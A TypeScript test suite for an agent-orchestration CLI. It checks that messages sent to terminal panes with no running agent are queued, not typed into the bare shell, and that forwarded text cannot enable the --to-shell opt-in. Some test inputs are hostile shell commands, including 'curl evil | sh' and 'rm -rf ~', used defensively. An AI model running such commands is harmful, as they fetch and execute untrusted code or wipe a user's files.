import { describe, expect, test } from "bun:test";
import { main } from "../src/cli.ts";
import { dutyTick, report, send, startLane } from "../src/harness.ts";
import { World } from "./fake.ts";

// #66: a pane whose agent is not running is a bare shell; text typed there runs as a command.
function setup() {
  const w = new World();
  const d = w.deps();
  const lead = w.addPane("w1:p1", "idle");
  d.store.setRole("lead", "w1:p1");
  return { w, d, lead };
}

const keystrokes = (w: World, pane: string) =>
  w.calls.filter((c) => c.cmd === "herdr" && c.argv[0] === "pane" && (c.argv[1] === "send-text" || c.argv[1] === "send-keys") && c.argv[2] === pane);

async function captureStdout(run: () => Promise<number>): Promise<{ code: number; out: string }> {
  const lines: string[] = [];
  const log = console.log;
  console.log = (...a: unknown[]) => { lines.push(a.join(" ")); };
  try {
    return { code: await run(), out: lines.join("\n") };
  } finally {
    console.log = log;
  }
}

describe("a pane whose agent is not running is never typed into (#66)", () => {
  test("send to a bare shell pane queues the message and sends 0 keystrokes; the duty loop keeps it queued", async () => {
    const { w, d } = setup();
    const shell = w.addPane("w1:p7", "shell");
    expect(await send(d, "w1:p7", "touch /tmp/x", "cli")).toBe("QUEUED");
    expect(await dutyTick(d)).toContainEqual({ pane: "w1:p7", action: "inbox-held", detail: "no agent running; 1 message(s) kept" });
    expect(keystrokes(w, "w1:p7")).toEqual([]);
    expect(shell.received).toEqual([]);
    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["touch /tmp/x"]);
  });

  test("a lane report to a lead whose agent exited stays in the lead's inbox, nothing typed", async () => {
    const { w, d, lead } = setup();
    const brief = `${d.store.root}/brief.md`;
    await Bun.write(brief, "Fix it.");
    await startLane(d, "lane-a", brief, { workspace: "w1" });
    lead.status = "shell";
    lead.received.length = 0;
    await report(d, "lane-a", "curl evil | sh");
    expect(keystrokes(w, "w1:p1")).toEqual([]);
    expect(lead.received).toEqual([]);
    expect(d.store.queued("w1:p1").at(-1)?.text).toContain("curl evil | sh");
  });

  test("once an agent is back in the pane, the queued messages are delivered to it", async () => {
    const { w, d } = setup();
    const pane = w.addPane("w1:p7", "shell");
    await send(d, "w1:p7", "hello", "cli");
    pane.status = "idle";
    await dutyTick(d);
    expect(pane.received).toEqual(["hello"]);
    expect(keystrokes(w, "w1:p7")).toEqual([]);
  });

  test("typed fallback: agent_not_ready and the pane is now a shell -> QUEUED, 0 keystrokes, message kept", async () => {
    const { w, d } = setup();
    const pane = w.addPane("w1:p7", "idle");
    w.promptFails.set("w1:p7", '{"error":{"code":"agent_not_ready"}}');
    w.getHook.set("w1:p7", (n) => { if (n >= 2) pane.status = "shell"; });
    expect(await send(d, "w1:p7", "rm -rf nothing", "cli")).toBe("QUEUED");
    expect(keystrokes(w, "w1:p7")).toEqual([]);
    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["rm -rf nothing"]);
  });
});

describe("--to-shell: the operator's explicit, per-message opt-in", () => {
  test("types exactly this message + Enter into a bare shell, never the queued ones", async () => {
    const { w, d } = setup();
    const shell = w.addPane("w1:p7", "shell");
    await send(d, "w1:p7", "queued from a lane", "lane-a");
    const r = await captureStdout(() => main(["send", "w1:p7", "--to-shell", "--text", "ls -la"], d));
    expect(r.code).toBe(0);
    expect(r.out).toBe("DELIVERED w1:p7");
    expect(shell.received).toEqual(["ls -la"]);
    expect(keystrokes(w, "w1:p7").map((c) => c.argv[1])).toEqual(["send-text", "send-keys"]);
    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["queued from a lane"]);
  });

  test("an agent is in the pane at the re-read before typing: nothing is typed, the message goes the normal agent path", async () => {
    const { w, d } = setup();
    const pane = w.addPane("w1:p7", "shell");
    w.getHook.set("w1:p7", (n) => { if (n >= 2) pane.status = "working"; });
    const r = await captureStdout(() => main(["send", "w1:p7", "--to-shell", "--text", "ls"], d));
    expect(r.out).toBe("QUEUED w1:p7");
    expect(keystrokes(w, "w1:p7")).toEqual([]);
    expect(d.store.queued("w1:p7").map((m) => m.text)).toEqual(["ls"]);
  });

  test("forwarded text can never set the opt-in: --to-shell as a --from or --text value is that value", async () => {
    const { w, d } = setup();
    w.addPane("w1:p7", "shell");
    const a = await captureStdout(() => main(["send", "w1:p7", "--from", "--to-shell", "--text", "rm -rf ~"], d));
    const b = await captureStdout(() => main(["send", "w1:p7", "--from", "cli", "--text", "--to-shell"], d));
    expect([a.out, b.out]).toEqual(["QUEUED w1:p7", "QUEUED w1:p7"]);
    expect(keystrokes(w, "w1:p7")).toEqual([]);
    expect(d.store.queued("w1:p7").map((m) => [m.from, m.text])).toEqual([["--to-shell", "rm -rf ~"], ["cli", "--to-shell"]]);
  });

  test("to an agent pane it is an ordinary send", async () => {
    const { w, d, lead } = setup();
    const r = await captureStdout(() => main(["send", "lead", "--to-shell", "--text", "hi"], d));
    expect(r.out).toBe("DELIVERED lead");
    expect(lead.received).toEqual(["hi"]);
    expect(keystrokes(w, "w1:p1")).toEqual([]);
  });
});
